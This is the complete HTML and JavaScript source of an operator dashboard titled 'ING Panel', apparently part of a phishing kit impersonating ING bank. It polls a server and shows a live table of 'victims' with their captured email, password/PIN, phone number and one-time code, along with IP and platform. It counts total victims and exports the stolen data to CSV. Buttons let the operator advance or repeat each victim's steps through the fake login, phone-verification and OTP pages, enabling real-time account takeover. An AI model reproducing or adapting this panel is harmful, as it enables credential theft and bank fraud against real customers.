<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ING Panel</title>
  <link rel="preconnect" href="https://rsms.me">
  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
  <style>
    :root {
      --bg: #000;
      --card: #0b0b0b;
      --border: rgba(255,255,255,0.06);
      --text: #f5f5f5;
      --muted: #8b8b8b;
      --green: #34d399;
      --red: #fb7185;
      --blue: #60a5fa;
      --yellow: #fbbf24;
      --radius: 18px;
    }
    *{box-sizing:border-box;font-family:Inter,system-ui,sans-serif;margin:0}
    body{background:radial-gradient(circle at 50% -20%,#111 0%,#000 60%);color:var(--text);padding:32px 28px}
    .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;max-width:1120px;margin-left:auto;margin-right:auto}
    .header h1{font-size:20px;font-weight:600}
    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;max-width:1120px;margin:0 auto 24px}
    .stat-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px}
    .stat-label{font-size:11px;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
    .stat-value{font-size:32px;font-weight:600}
    .main-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;max-width:1120px;margin:0 auto}
    .main-card h2{font-size:14px;margin-bottom:16px}
    table{width:100%;border-collapse:collapse;font-size:13px}
    th{text-align:left;padding:10px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:500;font-size:11px;text-transform:uppercase}
    td{padding:10px;border-bottom:1px solid rgba(255,255,255,0.03)}
    .cred{font-family:monospace;background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-size:12px}
    .btn{padding:6px 12px;border:1px solid var(--border);background:transparent;color:var(--text);border-radius:6px;cursor:pointer;font-size:12px}
    .btn:hover{background:rgba(255,255,255,0.05)}
    .btn-green{border-color:var(--green);color:var(--green)}
    .btn-red{border-color:var(--red);color:var(--red)}
    .btn-blue{border-color:var(--blue);color:var(--blue)}
    .actions{display:flex;gap:6px}
    .empty{text-align:center;color:var(--muted);padding:40px}
    #logout{float:right}
    .domain{color:var(--blue);text-decoration:none}
    .domain:hover{text-decoration:underline}
  </style>
</head>
<body>
  <div class="header">
    <h1>Hello, <span id="user">admin</span>! <span id="clock" style="color:var(--muted);font-size:14px;font-weight:400"></span></h1>
    <button class="btn" id="logout" onclick="logout()">Logout</button>
  </div>

  <div class="stats">
    <div class="stat-card">
      <div class="stat-label">Active Sessions</div>
      <div class="stat-value" id="active">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Total Visits</div>
      <div class="stat-value" id="total">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-label">Success</div>
      <div class="stat-value" id="success">0</div>
      <button class="btn" style="margin-top:8px;font-size:11px" onclick="exportCSV()">Export CSV</button>
    </div>
  </div>

  <div class="main-card">
    <h2>Active Sessions Â· <a id="domain" class="domain" href="#" target="_blank">-</a></h2>
    <table id="table">
      <thead>
        <tr>
          <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Status</th><th>Actions</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
    <div class="empty" id="empty">No active sessions</div>
  </div>

  <script>
    // Token from server injection (replaced by server)
    const SERVER_TOKEN = null;
    
    // Initialize auth token from multiple sources
    let AUTH_TOKEN = null;
    
    function initToken() {
      // Priority: server injection > URL param > localStorage > sessionStorage
      if (SERVER_TOKEN) {
        AUTH_TOKEN = SERVER_TOKEN;
        console.log('Using server-injected token');
      } else {
        const urlParams = new URLSearchParams(window.location.search);
        const urlToken = urlParams.get('token');
        
        if (urlToken) {
          AUTH_TOKEN = urlToken;
          console.log('Using URL token');
          // Store in both storages for redundancy
          try {
            localStorage.setItem('panel_token', AUTH_TOKEN);
            sessionStorage.setItem('panel_token', AUTH_TOKEN);
          } catch(e) {}
          // Clean URL without reloading
          if (window.history.replaceState) {
            window.history.replaceState({}, document.title, '/panel');
          }
        } else {
          // Try storage
          try {
            AUTH_TOKEN = localStorage.getItem('panel_token') || sessionStorage.getItem('panel_token');
          } catch(e) {}
          if (AUTH_TOKEN) {
            console.log('Using stored token');
          }
        }
      }
      
      if (!AUTH_TOKEN) {
        console.log('No token found, redirecting to login');
        window.location.href = '/panel';
        return false;
      }
      return true;
    }
    
    // Initialize immediately
    if (!initToken()) {
      throw new Error('Not authenticated');
    }

    // Clock
    setInterval(() => {
      document.getElementById('clock').textContent = new Date().toLocaleTimeString();
    }, 1000);

    function logout() {
      try {
        localStorage.removeItem('panel_token');
        sessionStorage.removeItem('panel_token');
      } catch(e) {}
      AUTH_TOKEN = null;
      window.location.href = '/panel/logout';
    }

    function exportCSV() {
      if (!AUTH_TOKEN) return;
      window.location.href = '/api/export?token=' + encodeURIComponent(AUTH_TOKEN);
    }

    function pageName(p) {
      const map = {'index.html':'LOGIN','verify.html':'PHONE','unregister.html':'UNREG','otp.html':'OTP','success':'DONE'};
      return map[p] || p;
    }

    function render(data) {
      // Update token if server returned new one
      if (data.token && data.token !== AUTH_TOKEN) {
        AUTH_TOKEN = data.token;
        try {
          localStorage.setItem('panel_token', AUTH_TOKEN);
          sessionStorage.setItem('panel_token', AUTH_TOKEN);
        } catch(e) {}
      }
      
      document.getElementById('user').textContent = data.username;
      document.getElementById('active').textContent = data.active;
      document.getElementById('total').textContent = data.totalVictims;
      document.getElementById('success').textContent = data.success;
      document.getElementById('domain').textContent = data.domain;
      document.getElementById('domain').href = data.domain;

      const tbody = document.querySelector('#table tbody');
      const empty = document.getElementById('empty');
      
      if (!data.sessions.length) {
        tbody.innerHTML = '';
        empty.style.display = 'block';
        return;
      }
      
      empty.style.display = 'none';
      tbody.innerHTML = data.sessions.map(s => `
        <tr>
          <td>${s.victimNum}</td>
          <td><span class="cred">${s.email || '-'}</span></td>
          <td><span class="cred">${s.password || '-'}</span></td>
          <td><span class="cred">${s.phone || '-'}</span></td>
          <td><span class="cred">${s.otp || '-'}</span></td>
          <td>${s.ip}</td>
          <td>${s.platform}</td>
          <td>${pageName(s.page)}</td>
          <td class="actions">
            ${s.page === 'index.html' && s.entered ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">â–¶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">âœ•</button>` : ''}
            ${s.page === 'verify.html' && s.phone ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">â–¶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">âœ•</button>` : ''}
            ${s.page === 'unregister.html' && s.unregisterClicked ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">â–¶</button>` : ''}
            ${s.page === 'otp.html' && s.otp ? `<button class="btn btn-green" onclick="action('cont','${s.sid}')">â–¶</button><button class="btn btn-red" onclick="action('redo','${s.sid}')">âœ•</button>` : ''}
            <button class="btn btn-blue" onclick="action('delete','${s.sid}')">ðŸ—‘</button>
          </td>
        </tr>
      `).join('');
    }

    function action(act, sid) {
      if (!AUTH_TOKEN) return;
      fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action: act, sid: sid})
      }).then(() => load());
    }

    let failCount = 0;
    
    function load() {
      if (!AUTH_TOKEN) {
        window.location.href = '/panel';
        return;
      }
      
      fetch('/api/panel?token=' + encodeURIComponent(AUTH_TOKEN))
        .then(r => {
          if (r.status === 401) {
            failCount++;
            if (failCount > 2) {
              // Clear storage and redirect
              try {
                localStorage.removeItem('panel_token');
                sessionStorage.removeItem('panel_token');
              } catch(e) {}
              window.location.href = '/panel';
            }
            return null;
          }
          failCount = 0;
          return r.json();
        })
        .then(data => {
          if (data) render(data);
        })
        .catch(e => {
          console.error('Load error:', e);
        });
    }

    // Load immediately and then poll
    load();
    setInterval(load, 2000);
  </script>
</body>
</html>
